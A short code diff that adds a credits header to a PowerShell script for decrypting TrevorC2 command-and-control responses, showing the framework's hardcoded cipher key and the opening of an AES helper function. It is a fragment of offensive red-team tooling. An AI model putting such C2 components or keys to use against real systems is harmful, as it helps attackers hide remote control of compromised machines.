@@ -1,3 +1,13 @@
+#PowerShell script to decrypt response for TrevorC2
+#
+# === Credits to  ===
+# TrevorC2 - legitimate looking command and control
+# Written by: Dave Kennedy @HackingDave
+# Website: https://www.trustedsec.com
+# GIT: https://github.com/trustedsec
+# PowerShell Module by Alex Williams @offsec_ginger
+# ====
+
 $CIPHER = "Tr3v0rC2R0x@nd1s@w350m3#TrevorForget"
 
 function Create-AesManagedObject($key, $IV) {
